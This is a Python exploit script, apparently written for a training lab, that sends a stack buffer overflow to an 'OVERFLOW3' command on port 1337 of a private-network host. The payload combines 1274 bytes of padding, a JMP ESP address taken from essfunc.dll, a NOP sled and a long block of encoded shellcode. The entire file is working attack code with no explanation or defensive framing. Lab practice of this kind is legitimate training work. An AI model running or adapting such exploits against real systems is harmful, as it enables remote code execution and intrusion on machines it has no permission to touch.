import socket
import sys
import time


print("[+] Nani???? Spot em all the Badchars!!\n")

buff = "A" * 1274

eip = "\x03\x12\x50\x62" #62501203 JMP ESP from essfunc.dll
nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xfc\xbb\xab\x60\x99\xaa\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x57\x88\x1b\xaa\xa7\x49\x7c\x22"
shellcode += b"\x42\x78\xbc\x50\x07\x2b\x0c\x12\x45\xc0\xe7"
shellcode += b"\x76\x7d\x53\x85\x5e\x72\xd4\x20\xb9\xbd\xe5"
shellcode += b"\x19\xf9\xdc\x65\x60\x2e\x3e\x57\xab\x23\x3f"
shellcode += b"\x90\xd6\xce\x6d\x49\x9c\x7d\x81\xfe\xe8\xbd"
shellcode += b"\x2a\x4c\xfc\xc5\xcf\x05\xff\xe4\x5e\x1d\xa6"
shellcode += b"\x26\x61\xf2\xd2\x6e\x79\x17\xde\x39\xf2\xe3"
shellcode += b"\x94\xbb\xd2\x3d\x54\x17\x1b\xf2\xa7\x69\x5c"
shellcode += b"\x35\x58\x1c\x94\x45\xe5\x27\x63\x37\x31\xad"
shellcode += b"\x77\x9f\xb2\x15\x53\x21\x16\xc3\x10\x2d\xd3"
shellcode += b"\x87\x7e\x32\xe2\x44\xf5\x4e\x6f\x6b\xd9\xc6"
shellcode += b"\x2b\x48\xfd\x83\xe8\xf1\xa4\x69\x5e\x0d\xb6"
shellcode += b"\xd1\x3f\xab\xbd\xfc\x54\xc6\x9c\x68\x98\xeb"
shellcode += b"\x1e\x69\xb6\x7c\x6d\x5b\x19\xd7\xf9\xd7\xd2"
shellcode += b"\xf1\xfe\x18\xc9\x46\x90\xe6\xf2\xb6\xb9\x2c"
shellcode += b"\xa6\xe6\xd1\x85\xc7\x6c\x21\x29\x12\x22\x71"
shellcode += b"\x85\xcd\x83\x21\x65\xbe\x6b\x2b\x6a\xe1\x8c"
shellcode += b"\x54\xa0\x8a\x27\xaf\x23\xbf\xa6\xa1\x3f\xd7"
shellcode += b"\xca\xbd\x2e\x74\x42\x5b\x3a\x94\x02\xf4\xd3"
shellcode += b"\x0d\x0f\x8e\x42\xd1\x85\xeb\x45\x59\x2a\x0c"
shellcode += b"\x0b\xaa\x47\x1e\xfc\x5a\x12\x7c\xab\x65\x88"
shellcode += b"\xe8\x37\xf7\x57\xe8\x3e\xe4\xcf\xbf\x17\xda"
shellcode += b"\x19\x55\x8a\x45\xb0\x4b\x57\x13\xfb\xcf\x8c"
shellcode += b"\xe0\x02\xce\x41\x5c\x21\xc0\x9f\x5d\x6d\xb4"
shellcode += b"\x4f\x08\x3b\x62\x36\xe2\x8d\xdc\xe0\x59\x44"
shellcode += b"\x88\x75\x92\x57\xce\x79\xff\x21\x2e\xcb\x56"
shellcode += b"\x74\x51\xe4\x3e\x70\x2a\x18\xdf\x7f\xe1\x98"
shellcode += b"\xff\x9d\x23\xd5\x97\x3b\xa6\x54\xfa\xbb\x1d"
shellcode += b"\x9a\x03\x38\x97\x63\xf0\x20\xd2\x66\xbc\xe6"
shellcode += b"\x0f\x1b\xad\x82\x2f\x88\xce\x86\x2f\x2e\x31"
shellcode += b"\x29"

#Final payload
payload = buff + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.54.232', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW3 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
